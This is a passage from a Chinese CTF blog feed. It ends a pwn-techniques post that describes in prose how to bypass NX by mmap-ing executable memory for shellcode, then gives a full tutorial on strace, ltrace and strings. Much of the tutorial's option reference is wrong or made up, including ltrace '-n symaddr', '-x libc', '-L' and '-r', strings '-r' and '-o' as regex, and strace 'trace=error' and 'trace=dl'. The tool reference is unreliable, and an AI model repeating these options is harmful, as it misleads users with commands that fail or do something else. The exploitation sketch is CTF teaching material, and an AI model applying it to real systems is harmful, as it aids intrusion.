href="https://github.com/scwuaptx/CTF/blob/master/2014-writeup/pwnable/exploitable/exploitable.md">例题</a></p><h3 id="7-使用mmap等函数映射内存"><a href="#7-使用mmap等函数映射内存" class="headerlink" title="7.使用mmap等函数映射内存"></a>7.使用mmap等函数映射内存</h3><p>通过调用mmap等函数，将一个可读写可执行的内存区域映射到进程空间，然后将shellcode写入这个内存区域并执行。<br>在某个程序中存在栈溢出漏洞，但是启用了NX保护。我们可以使用mmap()函数将一块可读写可执行的内存映射到进程空间，然后将shellcode写入这个内存区域，并手动在栈上伪造一个返回地址，使得程序执行完shellcode后会跳转到正确的位置。具体来说，我们可以首先调用mmap()函数映射一块可读写可执行的内存，然后使用strcpy()等函数将shellcode复制到这个内存区域，并在栈上伪造一个返回地址，使得程序执行完shellcode后会跳转到正确的位置。<br><a href="https://github.com/hitcon2016/exploit/blob/master/pwn/echo/README.md">例题</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二级制调试工具</title>
      <link href="/2023/04/04/er-jin-zhi-diao-shi-gong-ju/"/>
      <url>/2023/04/04/er-jin-zhi-diao-shi-gong-ju/</url>
      
        <content type="html"><![CDATA[<h2 id="1-strace"><a href="#1-strace" class="headerlink" title="1.strace"></a>1.strace</h2><p><code>strace</code> 是一个在 Linux 系统上常用的调试工具，可以用来跟踪进程的系统调用和信号。它可以帮助开发者了解程序的运行情况，发现可能存在的问题和错误。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><pre class="line-numbers language-none"><code class="language-none">strace [options] command [args]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，<code>command</code> 表示需要跟踪的程序，<code>args</code> 表示程序的参数。<code>options</code> 是一些可选参数，用于指定跟踪的选项。</p><p>例如，要跟踪运行 <code>ls</code> 命令的系统调用情况，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果会输出 <code>ls</code> 命令的所有系统调用。如果想将结果输出到文件中，可以使用 <code>-o</code> 选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-o</span> trace.log <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，<code>ls</code> 命令的系统调用信息会输出到 <code>trace.log</code> 文件中。<br><code>strace</code> 还提供了许多其它的选项，如 <code>-p</code> 选项用于跟踪指定进程的系统调用，<code>-f</code> 选项用于跟踪子进程的系统调用，<code>-e</code> 选项用于指定需要跟踪的系统调用类型等等。可以使用 <code>man strace</code> 命令查看完整的帮助文档。<br>除了基本的使用方法，<code>strace</code> 还提供了许多高级的选项和功能，下面介绍几个常用的选项和用法。</p><h3 id="跟踪某个系统调用"><a href="#跟踪某个系统调用" class="headerlink" title="跟踪某个系统调用"></a>跟踪某个系统调用</h3><p>有时候我们只想跟踪某个特定的系统调用，可以使用 <code>-e</code> 选项来指定：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token function">open</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令只会跟踪 <code>ls</code> 命令中的 <code>open</code> 系统调用。</p><h3 id="跟踪系统调用的参数和返回值"><a href="#跟踪系统调用的参数和返回值" class="headerlink" title="跟踪系统调用的参数和返回值"></a>跟踪系统调用的参数和返回值</h3><p>通过 <code>-v</code> 选项，可以让 <code>strace</code> 输出系统调用的参数和返回值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-v</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中每个系统调用的参数和返回值。</p><h3 id="跟踪动态链接库"><a href="#跟踪动态链接库" class="headerlink" title="跟踪动态链接库"></a>跟踪动态链接库</h3><p>许多程序在运行期间会动态链接一些库文件，可以使用 <code>-e trace=dl</code> 选项来跟踪这些动态链接库的加载情况：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>dl <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令动态链接的库文件的加载情况。</p><h3 id="过滤输出"><a href="#过滤输出" class="headerlink" title="过滤输出"></a>过滤输出</h3><p><code>strace</code> 输出的信息可能会非常多，可以使用 <code>-e trace=</code> 选项来过滤输出。例如，要只输出 <code>open</code> 和 <code>read</code> 两个系统调用的信息，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>open,read <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令只会输出 <code>ls</code> 命令中的 <code>open</code> 和 <code>read</code> 系统调用的信息。</p><h3 id="输出调用时间"><a href="#输出调用时间" class="headerlink" title="输出调用时间"></a>输出调用时间</h3><p>使用 <code>-T</code> 选项可以让 <code>strace</code> 输出每个系统调用的时间戳，用于分析程序的性能瓶颈：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-T</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中每个系统调用的时间戳。</p><h3 id="跟踪子进程"><a href="#跟踪子进程" class="headerlink" title="跟踪子进程"></a>跟踪子进程</h3><p>有些程序会创建子进程，可以使用 <code>-f</code> 选项来跟踪子进程的系统调用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-f</span> firefox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会跟踪 <code>firefox</code> 浏览器及其所有子进程的系统调用。</p><p>下面再介绍一些 <code>strace</code> 的高级选项和用法：</p><h3 id="输出调用堆栈"><a href="#输出调用堆栈" class="headerlink" title="输出调用堆栈"></a>输出调用堆栈</h3><p>使用 <code>-c</code> 选项可以让 <code>strace</code> 输出每个系统调用的调用次数和耗时总和。如果再加上 <code>-f</code> 选项，还可以输出每个子进程的调用次数和耗时总和：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-c</span> <span class="token parameter variable">-f</span> firefox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>firefox</code> 浏览器及其所有子进程每个系统调用的调用次数和耗时总和。</p><h3 id="跟踪文件操作"><a href="#跟踪文件操作" class="headerlink" title="跟踪文件操作"></a>跟踪文件操作</h3><p>使用 <code>-e trace=file</code> 选项可以让 <code>strace</code> 跟踪文件操作的系统调用，如 <code>open</code>、<code>read</code>、<code>write</code> 等。如果再加上 <code>-e trace=network</code> 选项，还可以跟踪网络操作的系统调用，如 <code>socket</code>、<code>connect</code>、<code>send</code>、<code>recv</code> 等：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>file,network <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中的文件操作和网络操作的系统调用。</p><h3 id="跟踪系统信号"><a href="#跟踪系统信号" class="headerlink" title="跟踪系统信号"></a>跟踪系统信号</h3><p>使用 <code>-e trace=signal</code> 选项可以让 <code>strace</code> 跟踪系统信号的发生情况：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>signal firefox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>firefox</code> 浏览器及其所有子进程接收到的系统信号。</p><h3 id="跟踪进程的系统调用时间"><a href="#跟踪进程的系统调用时间" class="headerlink" title="跟踪进程的系统调用时间"></a>跟踪进程的系统调用时间</h3><p>使用 <code>-T -ttt</code> 选项可以让 <code>strace</code> 输出每个系统调用的相对时间和绝对时间：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-T</span> <span class="token parameter variable">-ttt</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中每个系统调用的相对时间和绝对时间。</p><h3 id="跟踪进程的系统调用错误"><a href="#跟踪进程的系统调用错误" class="headerlink" title="跟踪进程的系统调用错误"></a>跟踪进程的系统调用错误</h3><p>使用 <code>-e trace=error</code> 选项可以让 <code>strace</code> 跟踪进程的系统调用错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>error <span class="token function">ls</span> /nonexistent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中发生的系统调用错误。</p><h2 id="2-ltrace"><a href="#2-ltrace" class="headerlink" title="2.ltrace"></a>2.ltrace</h2><p><code>ltrace</code> 是 Linux 下的一款动态库调用跟踪工具，可以跟踪程序执行时所调用的动态库函数，并输出它们的参数和返回值。</p><p>和 <code>strace</code> 类似，<code>ltrace</code> 也可以用于调试程序，查找程序中的问题，或者分析程序的性能瓶颈等。</p><p>下面介绍一些 <code>ltrace</code> 的基本用法和选项：</p><h3 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h3><p><code>ltrace</code> 的基本用法和 <code>strace</code> 类似，只需要在命令前加上 <code>ltrace</code> 即可，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会跟踪 <code>ls</code> 命令所调用的动态库函数，并输出它们的参数和返回值。</p><h3 id="跟踪指定的函数"><a href="#跟踪指定的函数" class="headerlink" title="跟踪指定的函数"></a>跟踪指定的函数</h3><p>可以使用 <code>-e</code> 选项来指定要跟踪的函数，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-e</span> getenv <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会跟踪 <code>ls</code> 命令中调用 <code>getenv</code> 函数的情况，并输出它的参数和返回值。</p><h3 id="过滤输出-1"><a href="#过滤输出-1" class="headerlink" title="过滤输出"></a>过滤输出</h3><p>和 <code>strace</code> 一样，<code>ltrace</code> 的输出也可能非常多，可以使用 <code>-c</code> 选项来统计函数调用次数和耗时总和，或者使用 <code>-S</code> 选项来按照函数调用次数或者耗时排序输出。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p><code>ltrace</code> 的输出格式可以使用 <code>-n</code> 选项来指定，目前支持的格式有 <code>raw</code>、<code>call</code> 和 <code>symaddr</code>。其中，<code>raw</code> 格式输出原始的函数调用信息，<code>call</code> 格式输出函数名和参数，<code>symaddr</code> 格式输出函数名和地址。</p><p>例如，要输出 <code>ls</code> 命令中调用的函数名和地址，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-n</span> symaddr <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="过滤动态链接库"><a href="#过滤动态链接库" class="headerlink" title="过滤动态链接库"></a>过滤动态链接库</h3><p>有些程序会调用很多的动态链接库，可以使用 <code>-x</code> 选项来过滤掉不需要跟踪的动态链接库。例如，要只跟踪 <code>libc</code> 动态链接库中的函数调用，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-x</span> libc <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面再介绍一些 <code>ltrace</code> 的高级选项和用法：</p><h3 id="跟踪指定进程"><a href="#跟踪指定进程" class="headerlink" title="跟踪指定进程"></a>跟踪指定进程</h3><p>可以使用 <code>-p</code> 选项来跟踪指定进程的动态库函数调用情况。例如，要跟踪进程 ID 为 1234 的进程的动态库函数调用，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-p</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪所有进程"><a href="#跟踪所有进程" class="headerlink" title="跟踪所有进程"></a>跟踪所有进程</h3><p>可以使用 <code>-a</code> 选项来跟踪所有进程的动态库函数调用情况。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪线程"><a href="#跟踪线程" class="headerlink" title="跟踪线程"></a>跟踪线程</h3><p>可以使用 <code>-t</code> 选项来跟踪线程的动态库函数调用情况。例如，要跟踪进程 ID 为 1234 的进程中线程 ID 为 5678 的线程的动态库函数调用，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-p</span> <span class="token number">1234</span> <span class="token parameter variable">-t</span> <span class="token number">5678</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪库函数的递归调用"><a href="#跟踪库函数的递归调用" class="headerlink" title="跟踪库函数的递归调用"></a>跟踪库函数的递归调用</h3><p>可以使用 <code>-L</code> 选项来跟踪库函数的递归调用情况。例如，要跟踪 <code>strlen</code> 函数的递归调用情况，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-L</span> strlen abcdefg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪函数库的系统调用"><a href="#跟踪函数库的系统调用" class="headerlink" title="跟踪函数库的系统调用"></a>跟踪函数库的系统调用</h3><p>可以使用 <code>-s</code> 选项来跟踪函数库的系统调用。例如，要跟踪 <code>libc</code> 动态链接库中的系统调用，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-s</span> libc <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪函数库的库函数"><a href="#跟踪函数库的库函数" class="headerlink" title="跟踪函数库的库函数"></a>跟踪函数库的库函数</h3><p>可以使用 <code>-r</code> 选项来跟踪函数库的库函数。例如，要跟踪 <code>libc</code> 动态链接库中的 <code>malloc</code> 函数的调用情况，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-r</span> libc malloc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-strings"><a href="#3-strings" class="headerlink" title="3.strings"></a>3.strings</h2><p><code>strings</code> 是一个 Linux&#x2F;Unix 命令行工具，它可以从一个二进制文件中提取所有的可打印字符串，即 ASCII 码表中的可见字符序列。这些字符串包括程序代码中的字符串常量、错误信息、调试信息等。</p><p>使用 <code>strings</code> 命令可以帮助我们快速地查看一个二进制文件中包含的文本信息，有助于分析程序的功能和特性。</p><p>下面是 <code>strings</code> 命令的一些基本用法和选项：</p><h3 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h3><p><code>strings</code> 命令的基本用法非常简单，只需要在命令行中指定要提取字符串的二进制文件即可，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中的所有可打印字符串。</p><h3 id="指定字符串长度"><a href="#指定字符串长度" class="headerlink" title="指定字符串长度"></a>指定字符串长度</h3><p>默认情况下，<code>strings</code> 命令会提取所有长度大于等于 4 的可打印字符串，可以使用 <code>-n</code> 选项来指定最小字符串长度，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-n</span> <span class="token number">8</span> /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有长度大于等于 8 的可打印字符串。</p><h3 id="指定字符集"><a href="#指定字符集" class="headerlink" title="指定字符集"></a>指定字符集</h3><p>默认情况下，<code>strings</code> 命令只会提取 ASCII 字符集中的可打印字符，可以使用 <code>-e</code> 选项来指定要提取的字符集，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-e</span> S /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有 ISO-8859-1 字符集中的可打印字符。</p><h3 id="输出偏移地址"><a href="#输出偏移地址" class="headerlink" title="输出偏移地址"></a>输出偏移地址</h3><p>可以使用 <code>-t</code> 选项来输出字符串在文件中的偏移地址，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-t</span> x /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有可打印字符串，并输出它们在文件中的偏移地址。</p><h3 id="忽略-NUL-字符"><a href="#忽略-NUL-字符" class="headerlink" title="忽略 NUL 字符"></a>忽略 NUL 字符</h3><p>默认情况下，<code>strings</code> 命令会将 NUL 字符（ASCII 码为 0）作为字符串的终止符，可以使用 <code>-a</code> 选项来忽略 NUL 字符，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-a</span> /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有可打印字符串，并将 NUL 字符作为普通字符处理。</p><h3 id="过滤字符串"><a href="#过滤字符串" class="headerlink" title="过滤字符串"></a>过滤字符串</h3><p>可以使用管道符号 <code>|</code> 将 <code>strings</code> 命令的输出传递给 <code>grep</code> 命令，从而过滤掉不需要的字符串，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/ls <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"ls --color"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有可打印字符串，并过滤掉不包含字符串 “ls –color” 的行。</p><p>下面再介绍一些 <code>strings</code> 的高级选项和用法：</p><h3 id="提取多个文件"><a href="#提取多个文件" class="headerlink" title="提取多个文件"></a>提取多个文件</h3><p>可以在命令行中指定多个二进制文件，<code>strings</code> 命令将会提取它们中所有的可打印字符串。例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/ls /usr/bin/cat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 和 <code>/usr/bin/cat</code> 文件中所有可打印字符串。</p><h3 id="递归提取字符串"><a href="#递归提取字符串" class="headerlink" title="递归提取字符串"></a>递归提取字符串</h3><p>可以使用 <code>-r</code> 选项来递归地提取目录中所有的二进制文件中的可打印字符串，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-r</span> /usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会递归地提取 <code>/usr/bin</code> 目录中所有二进制文件中的可打印字符串。</p><h3 id="提取-ELF-文件符号表"><a href="#提取-ELF-文件符号表" class="headerlink" title="提取 ELF 文件符号表"></a>提取 ELF 文件符号表</h3><p>可以使用 <code>-a</code> 选项来提取 ELF 文件的符号表中的字符串，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-a</span> /usr/lib/libc.so.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/lib/libc.so.6</code> 文件中符号表中的所有字符串。</p><h3 id="指定输出文件"><a href="#指定输出文件" class="headerlink" title="指定输出文件"></a>指定输出文件</h3><p>可以使用 <code>&gt;</code> 符号将 <code>strings</code> 命令的输出重定向到文件中，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/ls <span class="token operator">></span> ls_strings.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有可打印字符串，并将它们保存到 <code>ls_strings.txt</code> 文件中。</p><h3 id="使用正则表达式匹配字符串"><a href="#使用正则表达式匹配字符串" class="headerlink" title="使用正则表达式匹配字符串"></a>使用正则表达式匹配字符串</h3><p>可以使用 <code>-o</code> 选项和正则表达式来匹配要提取的字符串。例如，要提取所有以 “hello” 开头的字符串，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-o</span> /usr/bin/ls <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"^hello"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
